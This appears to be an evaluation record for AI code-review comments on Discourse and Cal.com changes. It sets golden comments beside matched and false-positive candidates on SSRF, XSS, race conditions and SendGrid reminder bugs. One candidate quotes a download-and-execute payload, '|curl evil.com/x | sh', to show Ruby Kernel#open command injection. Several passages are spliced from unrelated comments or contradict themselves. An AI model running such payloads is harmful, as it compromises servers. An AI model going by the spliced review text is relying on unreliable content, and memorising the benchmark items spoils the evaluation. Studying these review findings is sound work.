The new `website_name` method uses `URI(website.to_s).host` (with `rescue nil`) and `URI(website.to_s).path`, which behave inconsistently at the boundary. No tests cover: (1) a malformed URL such as `'not a valid url'` where `URI(...).host` raises (handled by `rescue nil`), (2) a URL with no path such as `http://example.com` where `URI().path` is `''`, producing `'example.com'`, or (3) a URL with a trailing slash such as `http://example.com/` where `URI().path` is `'/'`, producing `'example.com/'`. The trailing-slash inconsistency in particular means two visually identical URLs (one with, one without `/`) render different display text on the profile, which would surprise users and is worth either a test or explicit normalization in the serializer.

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on user-controlled URL allows command execution

`rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` invokes `Kernel#open` on the configured feed URL. Ruby's `Kernel.open` treats a leading `|` as a subshell command, so an admin who pastes or copy-pastes a URL like `|curl evil.com/x | sh` (or `|something`) into `feed_polling_url` will execute it as the Ruby process (which is the Rails/web process — typically the Discourse user, often with access to the DB and `Rails.env` secrets). Later versions of Discourse explicitly replace `Kernel.open` and `OpenURI.open_uri` everywhere this pattern appears for exactly this reason. Use `URI.open(SiteSetting.feed_polling_url)` (OpenURI) or an explicit HTTP client, with a redirect/host allowlist and size/time limits, instead of `Kernel.open`.
true_positives.reasoning: Both comments flag the same line: open(SiteSetting.feed_polling_url) is called without validating the URL. The golden comment frames the risk as SSRF, where the server fetches arbitrary URLs. The candidate frames it as command execution through Kernel#open's pipe handling, but its fix also calls for a host allowlist. The underlying flaw, unvalidated open on the setting, is the same. The emphasized attack differs, but it is close enough to count as a match.

true_positives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.
true_positives.matched_candidate:
postMessage targetOrigin should be origin only, not referer URL

The `postMessage` call uses `'<%= request.referer %>'` as the `targetOrigin` argument. `targetOrigin` should be a serialized origin (scheme + host + port) or `*`. Passing the full referer URL works in browsers because they parse the string down to its origin, but the correct and safe value is explicitly the origin. Worse, when `request.referer` is nil/empty (which `ensure_embeddable` allows when there is no Referer header), the rendered value becomes `parent.postMessage(..., '')`. An empty string is treated as `"*"` by browsers, causing the resize message to be sent to any window that has registered a `message` listener — a small but real information leak (the Discourse iframe's pixel height to any opener/parent). Render the referer's origin (e.g. `"#{URI(request.referer || '').scheme}://#{URI(request.referer || '').host}"`) and bail out (or send `null` height) when referer is missing.
true_positives.reasoning: Both comments flag the same code problem: the postMessage targetOrigin is set to the full referer URL instead of the origin. The candidate's claim about consequences differs. It says browsers parse the URL down to its origin, while the golden says the message gets dropped. The candidate also adds a point about the empty-referer case. Still, the core issue and the fix are the same.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
i.content may be nil and blows up on .scrub

`content = CGI.unescapeHTML(i.content.scrub)` assumes `i.content` is non-nil. Not every RSS/Atom item carries a `content` field — some provide only `description` or `summary`, in which case `SimpleRSS#content` returns `nil` and `nil.scrub` raises `NoMethodError`. A single malformed feed entry aborts the entire hourly poll job for the rest of the items in the batch and may surface in error reports. Use `i.content.presence || i.description.to_s` (or wrap in a guard) so missing content yields an empty string instead of an exception.
true_positives.reasoning: Both comments flag the same bug: `i.content` can be nil, so calling `.scrub` on it crashes. Both also suggest falling back to `description`.

false_positives.candidate:
raw_html cook_method bypasses sanitization, enabling stored XSS

In `Post#cook`, when `cook_method == Post.cook_methods[:raw_html]` the method returns `raw` verbatim, skipping `post_analyzer.cook(*args)` which is what normally runs sanitization (whitelisted image classes, host-aware link rewriting, etc.). The `TopicEmbed.import` flow (called from `TopicEmbed.import_remote` → `ruby-readability`, and from `Jobs::PollFeed` over fetched RSS items) creates these posts with `cook_method: Post.cook_methods[:raw_html]` and stores the upstream raw HTML as `raw`. Any HTML/JS present in the trusted-but-compromised source (a hijacked blog post, a malicious RSS entry, etc.) is therefore rendered to every visitor of the embed iframe, and because `best.html.erb` renders with `<%= raw post.cook %>`, nothing in the rendering path will scrub it. This is stored XSS inside the Discourse origin. At minimum, the `raw_html` branch must run the same sanitizer `cook` applies for regular posts (e.g. `PostAnalyzer.new(raw, topic_id).cook`), or, better, the cook_method selector should reject generic HTML and only accept a constrained subset.

Script throws if #discourse-comments is not present

`var comments = document.getElementById('discourse-comments')` is dereferenced at `comments.appendChild(iframe)` without a null check. If a third-party site embeds the script before the `#discourse-comments` div exists (wrong placement, dynamic page where the div hasn't been rendered yet, etc.), the script crashes on the `null.appendChild(...)` call and the rest of the IIFE — including the `postMessage` listener — never runs, so the embed silently fails and the iframe can never self-resize. Guard the append: `if (comments) { comments.appendChild(iframe); } else { document.body.appendChild(iframe); }`.

absolutize_urls corrupts protocol-relative URLs

`absolutize_urls` only absolutizes `href`/`src` values that `start_with?('/')`. Protocol-relative URLs like `//cdn.example.com/img.jpg` match that check but then `href.sub(/^\/+/, '')` strips every leading slash, so a value that is supposed to point at `https://cdn.example.com/img.jpg` is rewritten into `https://example.comcdn.example.com/img.jpg`. The link appears to be a same-origin resource, which is both broken (the image fails to load) and a small URL-confusion issue because the rendered URL points at the embed host. Detect protocol-relative inputs explicitly: `a['href'] = href.sub(/^\/+/, '/') if href.start_with?('//')` (keep the leading `//`) and append to `prefix` instead of inserting a literal slash.

TTL is set only on the racing process; throttle window is effectively unbounded

`retrieved_recently?` uses `SETNX` followed by `EXPIRE 60`. Between the `SETNX` and the `EXPIRE`, the key has no TTL — if the process dies in that gap (Sidekiq worker killed, VM paused) the key persists forever with the value `"1"`, and every subsequent attempt to retrieve that same embed URL will be silently throttled indefinitely because `invalid_host?` is the only other gate and the throttle check returns `true` first. Move the TTL into a single atomic call: `$redis.set(retrieved_key, '1', nx: true, ex: 60)` so the key is always created with its expiration. Additionally, the inverse race exists: two workers can both pass `retrieved_recently?` returning false simultaneously before either `SETNX` runs, and both will go on to call `TopicEmbed.import_remote` — the unique index on `topic_embeds.embed_url` is the only thing protecting against the double-import, and `TopicEmbed.import` calls `PostCreator.create` with side effects (notifications, draft sequence, message_bus publish) that aren't rolled back by the unique-index failure. These two issues combined mean the throttle provides at most a 60-second fence, not a deduplication guarantee, despite the name.

perform_retrieve runs the entire RSS poll synchronously inside a single embed import

`TopicRetriever#perform_retrieve` does `Jobs::PollFeed.new.execute({})` whenever feed polling is enabled. That job imports every item in the entire RSS feed in a single call — fetching and cooking N remote pages even when this retriever only cares about one specific `embed_url`. For a feed with dozens of entries the embedding request stalls for minutes, blocking the Sidekiq worker, and on every cached re-fetch the whole feed is re-iterated. Filter inside `poll_feed` (or split it into two methods, one keyed by URL) so the synchronous embed path only fetches the requested entry.

Stale/unrelated require_dependency 'email/sender'

`require_dependency 'email/sender'` is added at the top of the RetrieveTopic job but the job does not use the `Email::Sender` class (or anything else from the email stack) anywhere in this file. It appears to be a copy/paste leftover from another job. Keeping it loads the email autoload subtree unnecessarily on every Sidekiq run of this class and confuses readers searching for the dependency chain.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

false_positives.candidate:
Unsubscribe is a state-changing GET that also returns the full topic page

The new unsubscribe action is reached only via GET routes (config/routes.rb lines 440-441), yet it both mutates user state (`tu.save!` at line 113) and returns the rendered topic view (`perform_show_response` at line 115). The unsubscribe URL is embedded in every notification email (app/mailers/user_notifications.rb line 295, config/locales/server.en.yml), and link-previewers, antivirus scanners, corporate proxies, and prefetching mail clients routinely fetch URLs found in emails. The handler does `findFirst` then `create` or `update` in separate queries without a transaction. No error handling around decryption and JSON parse

`symmetricDecrypt(reqBody.keys, process.env.CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY || "")` will throw if the key is missing, wrong, or the ciphertext is malformed. The subsequent `JSON.parse` will throw if the decrypted plaintext is not valid JSON. Neither is wrapped in try/catch, so an invalid payload causes an unhandled exception and a 500 response, and the error details may leak. An attacker can probe the endpoint with random ciphertexts to enumerate behavior. Wrap in try/catch and return a 400 on decryption/parse failure.

Two issues in the secret check: (1) `!==` on the header value is not constant-time, allowing timing side-channel attacks to recover the secret byte-by-byte. Use `crypto.timingSafeEqual` on equal-length buffers. (2) `req.headers` keys are lowercased by Node, but the code looks up the header using `process.env.CALCOM_WEBHOOK_HEADER_NAME` as-is. If a self-hoster sets the env to a mixed-case name, the lookup silently fails (the comparison becomes `undefined !== secret` which is always true), and the endpoint returns 403 for legitimate requests. Normalize the env var to lowercase before lookup, or always lowercase the key.

No HTTP method check and no rate limiting

The handler processes any HTTP method (GET, PUT, DELETE, etc.) without checking `req.method`. It should explicitly accept only POST. Additionally, the endpoint has no rate limiting or brute-force protection beyond the shared secret. Combined with the non-constant-time comparison, an attacker who discovers the endpoint can attempt to brute-force the secret or flood it with requests.

The POST to `CALCOM_CREDENTIAL_SYNC_ENDPOINT` sends only `calcomUserId` and `appSlug` in the body. There is no shared secret, HMAC signature, or mutual TLS to authenticate the Cal.com instance to the self-hoster's endpoint. If the endpoint URL is discovered (e.g., via DNS enumeration or logs), an attacker can request refreshed tokens for arbitrary `calcomUserId` values, receiving valid access tokens for victims' third-party integrations. Add a signed payload (e.g., HMAC with a shared secret) or a bearer token header.

The `fetch` to the sync endpoint has no timeout. If the endpoint hangs or is slow, every token refresh in Cal.com will block on it, cascading into stalled calendar/video operations. Add an `AbortController` with a reasonable timeout (e.g., 10s).

The newly added block in `getClient` unconditionally fetches a new access token from Salesforce every time the method is called. Since `getClient` is invoked in the constructor (`this.conn = this.getClient(credential).then(c => c)`), every `new SalesforceCalendarService(credential)` — which happens for every booking/event involving Salesforce — triggers a token refresh request to Salesforce. This is a significant performance regression and risks hitting Salesforce API rate limits. The refresh should only happen when the existing token is expired or near expiry, matching the pattern used in other CalendarServices.

The `add.ts` handler hardcodes `redirectUri = WEBAPP_URL + "/api/integrations/zoho-bigin/callback"`, while the corresponding `callback.ts` (line 36) still uses `WEBAPP_URL + "/api/integrations/${appConfig.slug}/callback"`. Both files should use the same expression (preferably the config-based one).

The constant is defined as `process.env.CALCOM_WEBHOOK_SECRET && process.env.CALCOM_APP_CREDENTIAL_ENCRYPTION_KEY`, but the token refresh sync path additionally requires `process.env.CALCOM_CREDENTIAL_SYNC_ENDPOINT`. The correct command for 32 raw bytes is `openssl rand -base64 32` (which produces ~44 characters of base64). Two consequences: (a) every reminder after the failing one is never sent to SendGrid and will still be delivered, and (b) the `prisma.workflowReminder.delete` promises already pushed into `workflowRemindersToDelete` are never awaited — they become orphaned microtasks (also a memory leak) and any subsequent cron run will not see them cleaned up. The catch only logs and returns. Move the try/catch inside the loop (or use `Promise.allSettled`) so each cancellation is independent and all DB deletes are processed.

remindersToCancel query is missing the EMAIL method filter

`prisma.workflowReminder.findMany({ where: { cancelled: true, scheduledDate: { lte: dayjs().add(1, "hour").toISOString() } } })` does not filter by `method: WorkflowMethods.EMAIL`. SMS reminders don't currently reach `cancelled=true` (because `deleteScheduledSMSReminder` always deletes the row), but the only thing this query feeds is a SendGrid `/v3/user/scheduled_sends` POST with the `referenceId`, which is a SendGrid batch id. If anything ever marks an SMS reminder `cancelled=true`, the code would call SendGrid's email API with a Twilio SID. Add `method: WorkflowMethods.EMAIL`.

deleteScheduledEmailReminder with immediateDelete=true has no fallback when the SendGrid cancel fails

When `immediateDelete` is true and `client.request({ url: "/v3/user/scheduled_sends", method: "POST", body: { batch_id: referenceId, status: "cancel" } })` throws (e.g. SendGrid's 100-pending-cancellation limit described in the PR, or a transient HTTP error), the function catches the error, logs it, and returns without writing anything to the database. The `WorkflowReminder` row stays at `scheduled=true` with `cancelled=null`, so the new cron logic in `scheduleEmailReminders.ts` (which only matches `cancelled: true`) will never pick it up, and the email remains scheduled in SendGrid — i.e. the very bug the PR is supposed to fix. Fall back to setting `cancelled: true` when the immediate cancel fails so the cron will retry.

Reschedule in handleNewBooking passes immediateDelete=true, defeating the PR's fix for the SendGrid 100-cancellation limit

The PR's stated root cause for the original bug is that SendGrid caps pending cancellations at 100 and any new cancellation request beyond that silently fails, leaving the scheduled email in place. The new `cancelled`/cron approach in `scheduleEmailReminders.ts` exists precisely to avoid that cap. But here, on every successful reschedule, the code still calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)`, which goes straight to SendGrid's cancel API. Under any volume of reschedules this hits the same 100-pending-cancellations ceiling and rescheduled bookings will again leak their reminders. Use the same delayed-mark-cancelled approach as `handleCancelBooking.ts` (no `immediateDelete`) so the cron job, not the synchronous call, drives the actual SendGrid cancel.

Reschedule in handleNewBooking cancels immediately, but requestReschedule in bookings.tsx does not — same operation, different behavior

`handleNewBooking.ts` line 968 calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)` when an attendee reschedules, while `packages/trpc/server/routers/viewer/bookings.tsx` lines 488-494 in the `requestReschedule` mutation call `deleteScheduledEmailReminder(reminder.id, reminder.referenceId)` (no `immediateDelete`). Both code paths cancel the reminders of the same kind of booking (a cancelled-and-rebooked booking), so the resulting behavior — whether the email is gone immediately or up to a cron cycle later, and whether SendGrid is hit synchronously at all — should be identical. Pick one strategy and apply it in both places. The `handleNewBooking.ts` choice is also the one that reintroduces the 100-limit bug above.

Workflow step deletion uses immediateDelete=true while step editing does not — inconsistent with the PR's approach

In the `update` mutation, when a step is deleted (line 521) the code calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId, true)` (immediate delete), but when a step is merely edited (line 576) it calls `deleteScheduledEmailReminder(reminder.id, reminder.referenceId)` (deferred to the cron). Deleting and editing a workflow step both end with the old reminders no longer matching the workflow definition, so they should use the same cancellation strategy. As written, deleting a workflow on a high-traffic account still synchronously calls SendGrid's cancel API and risks the 100-pending-cancellations cap the PR is meant to work around.

First deleteMany runs before cancelled-reminder processing, racing SendGrid's send window

The handler first runs `prisma.workflowReminder.deleteMany({ where: { method: EMAIL, scheduledDate: { lte: dayjs().toISOString() } } })`, then finds `cancelled: true` reminders whose `scheduledDate <= now + 1h` and only then calls SendGrid's cancel API. A `cancelled=true` row whose `scheduledDate` is in the past (e.g. the cron was delayed and SendGrid has not yet processed `sendAt`) is wiped by the first deleteMany before it can be cancelled, and the email will be delivered. Process the `cancelled=true` cancellation loop before the past-dated cleanup deleteMany (or scope the cleanup deleteMany to `cancelled: { not: true }`).

Error in cancel-reminder catch is logged with console.log instead of console.error

Line 76 uses `console.log(\`Error cancelling scheduled Emails: ${error}\`)` while every other failure path in this file (lines 22, 29, 222) uses `console.log` for non-errors too, but this branch is explicitly an error case from the new cancellation loop. Use `console.error` so log-shipping and alerting can distinguish operational failures from normal output.

true_positives.golden_comment: The `sendAddGuestsEmails` function does not check the `disableStandardEmails` flags in the `EventType` metadata, which may result in sending emails to hosts/attendees even when standard emails are disabled for the event type.

false_positives.candidate:
No transaction / no error handling around calendar sync after DB update

`prisma.booking.update` writes the new attendees to the database first. `eventManager.updateCalendarAttendees(evt, booking)` is then awaited with no try/catch. If the calendar integration throws (rate limit, expired token, network, etc.), the function rejects with a 500, but the database already has the new attendees persisted. Result: the Cal.com booking now lists guests that are NOT on the linked Google/Outlook calendar, and the user has no way to roll back. The whole flow should be wrapped in a transaction or, at minimum, the calendar sync should happen first so a failure leaves the system consistent.

Any attendee can add arbitrary guests without organizer consent

Permission grants the addGuests capability not only to organizers and team admins/owners but also to any attendee (`isAttendee = !!booking.attendees.find(a => a.email === user.email)`). Combined with the lack of rate limiting, any invitee can enumerate or spam-add external email addresses to someone else's meeting. There is no confirmation from the organizer, and the organizer is only informed after the fact via `OrganizerAddGuestsEmail`. Either remove the attendee branch or require organizer approval.

No check on booking status before mutating

The handler never inspects `booking.status` or `booking.endTime`. It will happily persist new attendees onto CANCELLED, REJECTED, or already-finished bookings, and `eventManager.updateCalendarAttendees` will then either fail or silently modify a calendar event for a meeting that no longer exists. The handler should reject mutations on non-ACCEPTED or past bookings.

attendees[0].name accessed without null check in email subject

The subject template reads `this.calEvent.attendees[0].name`. If `attendees` is empty this throws a TypeError that aborts the email; if `attendees[0].name` is null/undefined the subject renders as "Guests Added: <eventType> with  at <date>". Add a guard or fall back to the organizer/team name.

isInvalidEmail flag is not cleared after a successful mutation

On validation failure `setIsInvalidEmail(true)` is called, but neither `onSuccess` nor `handleAdd` ever resets it back to false. A user who first submits invalid emails, then fixes them and successfully adds guests, will continue to see the red "Emails must be unique and valid" banner in the dialog (and after reopening the dialog for the same booking) until the Cancel button is clicked. Reset the flag at the start of `handleAdd` and inside `onSuccess`.

addGuests uses authedProcedure instead of bookingsProcedure

Sibling mutations that touch a booking (`editLocation`, `confirm`, etc.) use `bookingsProcedure`, which typically enforces booking-level permission middleware. `addGuests` is wired with the looser `authedProcedure`, so any authenticated user can hit the endpoint and the only authorization is the handler's own checks (which have the bugs noted above). Use `bookingsProcedure` for consistency and to inherit the centralized guards.

`catch (err) { console.log("Error sending AddGuestsEmails"); }` discards the error object entirely (notice `console.log` rather than `console.error`, and `err` is not used). Use `logger.error(...)` from `@calcom/lib/logger` like the rest of the file, and include `err` so the failure is diagnosable in production.

Direct reassignment of a prop

`value = value || [];` mutates the `value` prop in place. While React does not re-render on prop mutation, this is misleading code and means subsequent reads use the mutated object reference. Use a default parameter (`value = []` in the signature) or a local `const emails = value ?? []`.

Using array index as React key in the email list

`value.map((field, index) => <li key={index} ...)` reuses keys when emails are added/removed, which causes React to reuse input components and can lose focus/caret position or render stale values for the newly inserted empty input. Use a stable id (e.g. include the email value or a counter ref).

true_positives.golden_comment: Because backupCodes are decrypted and mutated in memory before being written back, two concurrent login requests using the same backupCode could both pass this check and update, so a single backup code may effectively be accepted more than once if used concurrently, weakening the intended one-time-use semantics.

Two concurrent authorize() calls presenting the same backup code can both read the original array, both nullify index N, and both persist - the second call sees an apparently-valid code and authenticates. The window is small in practice (single user/device), but it directly violates the 'one-time use' guarantee that backup codes are sold on, and is worth a note.

In the login flow the user has not yet authenticated, so directing them to settings is not actionable, and the message distinguishes users who have backup codes from those who do not - a small information leak about account state that is otherwise collapsed into a generic error.

false_positives.candidate:
hosts.map users lack destinationCalendar, so teamDestinationCalendars stays empty

In the new loadUsers(), when the event has hosts, `users` is built via `hosts.map(({ user, isFixed }) => ({ ...user, isFixed }))`. The `user` record on each host is whatever Prisma returned for the relation; no explicit `select`/`include` is added, so relation fields like `destinationCalendar` are not present on those `user` objects. Downstream, `teamMemberPromises` does `if (isTeamEventType && eventType.schedulingType === "COLLECTIVE" && user.destinationCalendar)` and pushes to `teamDestinationCalendars` — this will always be undefined for host-loaded users, so `teamDestinationCalendars` ends up empty for COLLECTIVE team events. The whole point of this PR (multiple hosts receiving calendar events) silently fails whenever hosts come from the `eventType.hosts` relation.

evt.destinationCalendar?.push silently no-ops when null

Right above, `destinationCalendar` is set to `null` when neither `eventType.destinationCalendar` nor `organizerUser.destinationCalendar` is set. The follow-up `if (isTeamEventType && eventType.schedulingType === "COLLECTIVE") { evt.destinationCalendar?.push(...teamDestinationCalendars); }` uses optional chaining on a potentially null array — `null?.push` is just `undefined`, it does nothing and does not warn. For any COLLECTIVE event without an event-type or organizer destination calendar, no team members' destination calendars are attached to `evt`, even though they were collected into `teamDestinationCalendars`. Replace `?.push(...)` with an explicit `evt.destinationCalendar ??= []; evt.destinationCalendar.push(...)` (or build the final array once and assign it).

Only first destination calendar is persisted on the booking

The booking `data` block writes `destinationCalendar: evt.destinationCalendar && evt.destinationCalendar.length > 0 ? { connect: { id: evt.destinationCalendar[0].id } } : undefined`. The Booking schema has a single `destinationCalendar` relation, so only the first entry in `evt.destinationCalendar` is persisted. The PR’s stated goal is to invite every host to their own calendar, but on any later operation (reschedule, cancel, edit-location, request-reschedule) the booking record exposes only one destination. The other per-host calendar references survive only as BookingReference rows; deleting the booking.destinationCalendar connect for the event-type even on first creation breaks the previously persisted id reference for non-collective callers and silently drops the per-host mapping for re-runs. Either the schema needs to become a join table, or the booking should record which host’s calendar it was set under and consumers must be updated accordingly — this PR ships neither.

deleteEvent fallback also searches by externalId === externalCalendarId

Same defect as in `updateEvent`. `const calendarId = externalCalendarId ? externalCalendarId : event.destinationCalendar?.find((cal) => cal.externalId === externalCalendarId)?.externalId;` — when `externalCalendarId` is null/empty the `find` predicate compares each calendar’s externalId against that same null/empty value, so the find never matches and the fallback always yields `undefined`. The eventual ternary `calendarId ? calendarId : defaultCalendarId` then drops to `"primary"`, which is the wrong calendar for multi-host events and can delete from the wrong account or simply 404. Either use `event.destinationCalendar?.[0]?.externalId` for the fallback or restrict the lookup to a credentialId-keyed match.

loadUsers aggressively throws on empty dynamicUserList and is no longer required to return users

The new `loadUsers` wraps everything in try/catch and throws HttpError(500, "Unable to load users") for any non-HttpError/non-Prisma error, and adds new preconditions that the previous version lacked: `if (!Array.isArray(dynamicUserList) || dynamicUserList.length === 0) throw new Error("dynamicUserList is not properly defined or empty.")` and `if (!Array.isArray(hosts)) throw new Error("eventType.hosts is not properly defined.")`. Empty `dynamicUserList` was previously allowed to fall through to a normal empty result; a route that legitimately resolves no users (e.g., data issues) will now return 500/400 instead of being handled by upstream `ensureAvailableUsers` guards. Also, `return users.length ? users : eventType.users` evaluates eventType.users only after spreading hosts — for a non-host regular event this works, but for a team event with `eventType.schedulingType=ROUND_ROBIN` and no hosts it now returns the legacy `eventType.users` array and silently bypasses the host semantics the rest of the code expects.

Team member shape adds unknown firstName/lastName empty fields

`teamMemberPromises` returns `firstName: "", lastName: ""` for every team member, but the `Person` type in `@calcom/types/Calendar` has no such keys (only `name`, `email`, `timeZone`, `language`, `username`, `id`, `bookingId`, `locale`, `timeFormat`, `bookingSeat`).
